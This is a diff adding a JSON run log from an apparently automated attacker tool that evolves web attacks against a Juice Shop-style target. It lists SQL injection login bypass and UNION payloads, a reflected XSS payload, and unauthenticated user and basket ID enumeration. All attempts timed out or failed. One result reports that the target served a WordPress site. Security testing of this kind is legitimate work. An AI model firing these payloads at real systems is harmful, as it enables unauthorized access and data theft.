@@ -1,0 +1,309 @@
+{
+  "run_id": "r1779574693",
+  "target_url": "https://docker-image-production-c431.up.railway.app/",
+  "started_at": "2026-05-23T22:18:13Z",
+  "finished_at": "2026-05-23T22:20:49Z",
+  "duration_s": 155.734952798,
+  "generations_run": 2,
+  "total_pods": 10,
+  "outcome": "EXHAUSTED",
+  "best_fitness": 0,
+  "breach": null,
+  "per_generation": [
+    {
+      "generation": 1,
+      "population": 5,
+      "survivors": 0,
+      "best_fitness": 0,
+      "breaches": 0,
+      "per_pod": [
+        {
+          "Genome": {
+            "vector": "sqli_login",
+            "category": "injection",
+            "technique": "tautology",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' OR 1=1--",
+              "password": "x"
+            },
+            "hint": "Try classic auth bypass via SQL tautology in email field."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "r1779574693",
+            "pod_id": "r1779574693-g1-p0",
+            "generation": 1,
+            "vector": "sqli_login",
+            "category": "injection",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "pi timed out after 60s",
+            "raw_findings": [],
+            "duration_ms": 61000,
+            "t": 1779574756528
+          },
+          "Fitness": 0,
+          "PodID": "r1779574693-g1-p0"
+        },
+        {
+          "Genome": {
+            "vector": "sqli_login_union",
+            "category": "injection",
+            "technique": "union_select",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' UNION SELECT 1,2,3,4,5--"
+            },
+            "hint": "Try UNION-based info leak."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "r1779574693",
+            "pod_id": "r1779574693-g1-p1",
+            "generation": 1,
+            "vector": "sqli_login_union",
+            "category": "injection",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "pi timed out after 60s",
+            "raw_findings": [],
+            "duration_ms": 62000,
+            "t": 1779574757509
+          },
+          "Fitness": 0,
+          "PodID": "r1779574693-g1-p1"
+        },
+        {
+          "Genome": {
+            "vector": "xss_search_reflected",
+            "category": "xss",
+            "technique": "reflected",
+            "target_path": "/#/search",
+            "params": {
+              "q": "\u003ciframe src=javascript:alert(1)\u003e"
+            },
+            "hint": "Try reflected XSS via search query parameter."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "r1779574693",
+            "pod_id": "r1779574693-g1-p2",
+            "generation": 1,
+            "vector": "xss_search_reflected",
+            "category": "xss",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "pi timed out after 60s",
+            "raw_findings": [],
+            "duration_ms": 61000,
+            "t": 1779574756524
+          },
+          "Fitness": 0,
+          "PodID": "r1779574693-g1-p2"
+        },
+        {
+          "Genome": {
+            "vector": "bola_users",
+            "category": "access_control",
+            "technique": "id_enumeration",
+            "target_path": "/api/Users/1",
+            "params": {},
+            "hint": "Try fetching admin user by ID without auth."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "r1779574693",
+            "pod_id": "r1779574693-g1-p3",
+            "generation": 1,
+            "vector": "bola_users",
+            "category": "access_control",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "pi timed out after 60s",
+            "raw_findings": [],
+            "duration_ms": 62000,
+            "t": 1779574757805
+          },
+          "Fitness": 0,
+          "PodID": "r1779574693-g1-p3"
+        },
+        {
+          "Genome": {
+            "vector": "admin_section",
+            "category": "access_control",
+            "technique": "force_browse",
+            "target_path": "/#/administration",
+            "params": {},
+            "hint": "Try to reach admin UI directly.",
+            "requires_nimble": true
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "",
+            "pod_id": "",
+            "generation": 0,
+            "vector": "",
+            "category": "",
+            "status": "",
+            "fitness": 0,
+            "evidence": "The target path /#/administration returned a WordPress site instead of an administration interface, suggesting the intended application (Juice Shop) is not present or the route is not functioning as an SPA route.",
+            "raw_findings": null,
+            "duration_ms": 0,
+            "t": 0
+          },
+          "Fitness": 0,
+          "PodID": "r1779574693-g1-p4"
+        }
+      ]
+    },
+    {
+      "generation": 2,
+      "population": 5,
+      "survivors": 0,
+      "best_fitness": 0,
+      "breaches": 0,
+      "per_pod": [
+        {
+          "Genome": {
+            "vector": "sqli_login",
+            "category": "injection",
+            "technique": "tautology",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' OR 1=1--",
+              "password": "x"
+            },
+            "hint": "Try classic auth bypass via SQL tautology in email field."
+          },
+          "Result": {
+            "type": "",
+            "run_id": "",
+            "pod_id": "",
+            "generation": 0,
+            "vector": "",
+            "category": "",
+            "status": "ERROR",
+            "fitness": 0,
+            "evidence": "spawn.RunPod: wait: k8s.WaitForCompletion: openzerg/openzerg-attacker-r1779574693-g2-p0: context canceled",
+            "raw_findings": null,
+            "duration_ms": 0,
+            "t": 0
+          },
+          "Fitness": 0,
+          "PodID": "r1779574693-g2-p0"
+        },
+        {
+          "Genome": {
+            "vector": "sqli_login_union",
+            "category": "injection",
+            "technique": "union_select",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' UNION SELECT 1,2,3,4,5--"
+            },
+            "hint": "Try UNION-based info leak."
+          },
+          "Result": {
+            "type": "",
+            "run_id": "",
+            "pod_id": "",
+            "generation": 0,
+            "vector": "",
+            "category": "",
+            "status": "ERROR",
+            "fitness": 0,
+            "evidence": "spawn.RunPod: wait: k8s.WaitForCompletion: openzerg/openzerg-attacker-r1779574693-g2-p1: context canceled",
+            "raw_findings": null,
+            "duration_ms": 0,
+            "t": 0
+          },
+          "Fitness": 0,
+          "PodID": "r1779574693-g2-p1"
+        },
+        {
+          "Genome": {
+            "vector": "xss_search_reflected",
+            "category": "xss",
+            "technique": "reflected",
+            "target_path": "/#/search",
+            "params": {
+              "q": "\u003ciframe src=javascript:alert(1)\u003e"
+            },
+            "hint": "Try reflected XSS via search query parameter."
+          },
+          "Result": {
+            "type": "",
+            "run_id": "",
+            "pod_id": "",
+            "generation": 0,
+            "vector": "",
+            "category": "",
+            "status": "ERROR",
+            "fitness": 0,
+            "evidence": "spawn.RunPod: wait: k8s.WaitForCompletion: openzerg/openzerg-attacker-r1779574693-g2-p2: context canceled",
+            "raw_findings": null,
+            "duration_ms": 0,
+            "t": 0
+          },
+          "Fitness": 0,
+          "PodID": "r1779574693-g2-p2"
+        },
+        {
+          "Genome": {
+            "vector": "bola_users",
+            "category": "access_control",
+            "technique": "id_enumeration",
+            "target_path": "/api/Users/1",
+            "params": {},
+            "hint": "Try fetching admin user by ID without auth."
+          },
+          "Result": {
+            "type": "",
+            "run_id": "",
+            "pod_id": "",
+            "generation": 0,
+            "vector": "",
+            "category": "",
+            "status": "ERROR",
+            "fitness": 0,
+            "evidence": "spawn.RunPod: wait: k8s.WaitForCompletion: openzerg/openzerg-attacker-r1779574693-g2-p3: context canceled",
+            "raw_findings": null,
+            "duration_ms": 0,
+            "t": 0
+          },
+          "Fitness": 0,
+          "PodID": "r1779574693-g2-p3"
+        },
+        {
+          "Genome": {
+            "vector": "bola_baskets",
+            "category": "access_control",
+            "technique": "id_enumeration",
+            "target_path": "/rest/basket/1",
+            "params": {},
+            "hint": "Try fetching another user's basket."
+          },
+          "Result": {
+            "type": "",
+            "run_id": "",
+            "pod_id": "",
+            "generation": 0,
+            "vector": "",
+            "category": "",
+            "status": "ERROR",
+            "fitness": 0,
+            "evidence": "spawn.RunPod: wait: k8s.WaitForCompletion: openzerg/openzerg-attacker-r1779574693-g2-p4: context canceled",
+            "raw_findings": null,
+            "duration_ms": 0,
+            "t": 0
+          },
+          "Fitness": 0,
+          "PodID": "r1779574693-g2-p4"
+        }
+      ]
+    }
+  ],
+  "narrative_md_path": "out/summary-r1779574693.md",
+  "cancelled": true
+}
